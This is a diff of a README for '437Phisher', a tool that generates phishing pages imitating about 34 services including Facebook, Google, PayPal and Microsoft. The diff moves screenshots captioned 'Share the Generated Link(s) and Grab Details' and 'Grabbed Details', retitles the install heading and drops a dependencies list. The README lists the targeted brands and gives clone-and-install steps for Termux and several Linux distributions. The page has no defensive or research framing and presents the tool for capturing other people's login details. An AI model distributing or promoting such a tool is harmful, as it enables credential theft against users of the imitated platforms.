@@ -14,20 +14,6 @@
 
 ### Creatable Phishing Links
 - Facebook, Instagram, Google, Microsoft, Netflix, PayPal, Steam, Twitter, Playstation, Tiktok, Twitch, Pinterest, Snapchat, LinkedIn, Ebay, Quora, Protonmail, Spotify, Reddit, Adobe, DeviantArt, Badoo, Origin, Dropbox, Yahoo, Wordprogress, Yandex, StackoverFlow, Vk, XBOX, Github, Gitlab, Mediafire, Airbnb
-<h2 align="center"></h2>
-
-## Screenshots:
-
-#### Menu:
-![image](Screenshots/Screenshot_20240511_112851_Termux.jpg)
-
-#### Share the Generated Link(s) and Grab Details:
-![image](Screenshots/Screenshot_20240511_112922_Termux.jpg)
-
-#### Grabbed Details:
-![image](https://github.com/RenderBolt96/437Phisher/blob/63eb7c5f5265a78012d23fec21cf7497c2d314ca/Screenshot_20240510_221057_Termux.jpg)
-
-<h2 align="center">Step-by-Step Installation(copy and paste the commands one-by-one!)</h2>
 
 #### Upgrade Your Packages:
 ```sh
@@ -68,20 +54,22 @@ git clone https://github.com/RenderBolt96/437Phisher.git
 ```sh
 git clone https://github.com/RenderBolt96/437Phisher.git
 ```
-<h2 align="center">Do ALL In ONE COMMAND</h2>
+<h2 align="center">OR INSTALL ALL WITH ONE COMMAND</h2>
 
 ```sh
 git clone https://github.com/RenderBolt96/437Phisher.git
 ```
 
-- ### Dependencies
-**`437Phisher`** requires following programs to run properly - 
-- `php`
-- `wget`
-- `curl`
-- `git`
+<h2 align="center">Screenshots</h2>
 
-> All the dependencies will be installed automatically when you run `437Phisher` for the first time.
+#### Menu:
+![image](Screenshots/Screenshot_20240511_112851_Termux.jpg)
+
+#### Share the Generated Link(s) and Grab Details:
+![image](Screenshots/Screenshot_20240511_112922_Termux.jpg)
+
+#### Grabbed Details:
+![image](https://github.com/RenderBolt96/437Phisher/blob/63eb7c5f5265a78012d23fec21cf7497c2d314ca/Screenshot_20240510_221057_Termux.jpg)
 
 > Supported Platform : **`Termux`**, **`Ubuntu/Debian/Kali/Parrot`**, **`Arch Linux/Manjaro`**, **`Fedora`**
 ### Special Thanks :
